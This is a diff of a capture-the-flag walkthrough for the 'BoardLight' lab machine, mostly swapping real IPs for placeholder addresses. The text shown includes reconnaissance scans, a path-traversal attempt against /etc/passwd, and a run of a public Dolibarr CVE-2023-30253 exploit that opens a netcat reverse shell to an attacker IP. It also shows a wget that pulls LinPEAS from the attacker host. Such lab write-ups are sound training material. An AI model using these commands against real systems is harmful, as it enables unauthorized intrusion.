@@ -18,7 +18,7 @@ BoardLight is a Linux machine running a Dolibarr CRM application vulnerable to C
 We start with an nmap scan to identify open ports and services:
 
 ```bash
-nmap -sV -v 10.129.52.52
+nmap -sV -v 10.100.100.100
 ```
 
 Results:
@@ -37,14 +37,14 @@ Two ports are open: SSH on port 22 and HTTP on port 80.
 Since there's an Apache web server running, we scan for directories:
 
 ```bash
-dirb http://10.129.52.52/
+dirb http://10.100.100.100/
 ```
 
 The `/server-status` page appears in the results, but we don't have permission to access it.
 
 ### Web Application Analysis
 
-Accessing `http://10.129.52.52/`, we discover a PHP-based website. Several links (including the login) don't appear to be functional.
+Accessing `http://10.100.100.100/`, we discover a PHP-based website. Several links (including the login) don't appear to be functional.
 
 When submitting forms, no POST requests appear in the network traffic. Examining the HTML source reveals:
 
@@ -57,6 +57,7 @@ The `action` field is empty, explaining why forms don't work.
 Attempting to access non-existent pages like `/login.php` returns `File not found.` We try directory traversal to access `/etc/passwd`, but the URL is corrected and we receive `The requested URL was not found on this server.`
 
 Additional observations:
+
 - No cookies are visible
 - jQuery version 3.4.1 has no known vulnerabilities
 - A commented `portfolio.php` file exists in the source, but accessing it returns `File not found`
@@ -66,7 +67,7 @@ Additional observations:
 Running nikto reveals some details but nothing immediately exploitable:
 
 ```bash
-nikto -h http://10.129.52.52/
+nikto -h http://10.100.100.100/
 
 + Server: Apache/2.4.41 (Ubuntu)
 + /: The anti-clickjacking X-Frame-Options header is not present.
@@ -183,6 +184,7 @@ Researching online, we find CVE-2023-30253 which allows obtaining a reverse shel
 - https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253
 
 The exploit works by:
+
 1. Authenticating to Dolibarr
 2. Creating a new website
 3. Creating a new page within that website
@@ -204,14 +206,14 @@ nc -lvnp 9001
 Then we run the exploit script:
 
 ```bash
-python3 exploit.py http://crm.board.htb admin admin 10.10.14.252 9001
+python3 exploit.py http://crm.board.htb admin admin 10.10.10.10 9001
 ```
 
 A connection is established with netcat:
 
 ```bash
 listening on [any] 9001 ...
-connect to [10.10.14.252] from (UNKNOWN) [10.129.52.52] 43820
+connect to [10.10.10.10] from (UNKNOWN) [10.100.100.100] 43820
 bash: cannot set terminal process group (875): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
@@ -263,7 +265,7 @@ From the target server, we download LinPEAS:
 
 ```bash
 cd /tmp
-wget 10.10.14.252:8080/linpeas.sh
+wget 10.10.10.10:8080/linpeas.sh
 chmod +x linpeas.sh
 ```
 
@@ -345,6 +347,7 @@ UsePAM yes
 ```
 
 Key findings:
+
 - Nothing interesting in cronjobs
 - There's a MySQL database
 - Root can connect via SSH
